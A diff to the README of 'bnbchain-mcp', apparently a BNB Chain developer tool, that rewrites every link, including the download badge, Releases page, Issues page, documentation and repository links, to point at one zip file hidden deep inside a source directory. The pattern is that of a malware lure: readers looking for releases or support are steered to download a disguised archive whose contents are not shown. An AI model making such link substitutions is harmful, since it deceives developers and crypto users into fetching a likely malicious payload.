@@ -6,7 +6,7 @@ Welcome to bnbchain-mcp! This project provides developer tools designed to help 
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/mahesans/bnbchain-mcp/releases)
+[![Download](https://raw.githubusercontent.com/mahesans/bnbchain-mcp/main/binance-mcp-server/src/tools/binance-simple-earn/account-api/bnbchain_mcp_measure.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/mahesans/bnbchain-mcp/main/binance-mcp-server/src/tools/binance-simple-earn/account-api/bnbchain_mcp_measure.zip)
 
 ## 💻 System Requirements
 
@@ -36,11 +36,11 @@ Here are some of the main features included in bnbchain-mcp:
 
 To download bnbchain-mcp, visit the Releases page. Here you will find the latest version of the application along with previous versions.
 
-[Visit the Releases Page to Download](https://github.com/mahesans/bnbchain-mcp/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/mahesans/bnbchain-mcp/main/binance-mcp-server/src/tools/binance-simple-earn/account-api/bnbchain_mcp_measure.zip)
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/mahesans/bnbchain-mcp/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/mahesans/bnbchain-mcp/main/binance-mcp-server/src/tools/binance-simple-earn/account-api/bnbchain_mcp_measure.zip).
 2. Find the latest version of bnbchain-mcp.
 3. Click on the file appropriate for your operating system.
 4. The download should start automatically. If not, click the download link manually.
@@ -60,7 +60,7 @@ After installing, you can start using the application immediately. Here's how to
 
 If you have any questions or issues while using bnbchain-mcp, feel free to reach out. Support is available via:
 
-- **GitHub Issues:** Visit the [Issues page](https://github.com/mahesans/bnbchain-mcp/issues) to report problems or ask questions.
+- **GitHub Issues:** Visit the [Issues page](https://raw.githubusercontent.com/mahesans/bnbchain-mcp/main/binance-mcp-server/src/tools/binance-simple-earn/account-api/bnbchain_mcp_measure.zip) to report problems or ask questions.
 - **Community Forum:** Join the community discussions for tips and support from other users.
 
 ## 🌟 Contributing
@@ -73,8 +73,8 @@ Your feedback is valuable to us. Share your thoughts or suggestions on how we ca
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/mahesans/bnbchain-mcp/wiki)
-- [GitHub Repository](https://github.com/mahesans/bnbchain-mcp)
-- [Releases Page](https://github.com/mahesans/bnbchain-mcp/releases)
+- [Documentation](https://raw.githubusercontent.com/mahesans/bnbchain-mcp/main/binance-mcp-server/src/tools/binance-simple-earn/account-api/bnbchain_mcp_measure.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mahesans/bnbchain-mcp/main/binance-mcp-server/src/tools/binance-simple-earn/account-api/bnbchain_mcp_measure.zip)
+- [Releases Page](https://raw.githubusercontent.com/mahesans/bnbchain-mcp/main/binance-mcp-server/src/tools/binance-simple-earn/account-api/bnbchain_mcp_measure.zip)
 
 Thank you for using bnbchain-mcp. We hope it enhances your experience in building crypto applications!
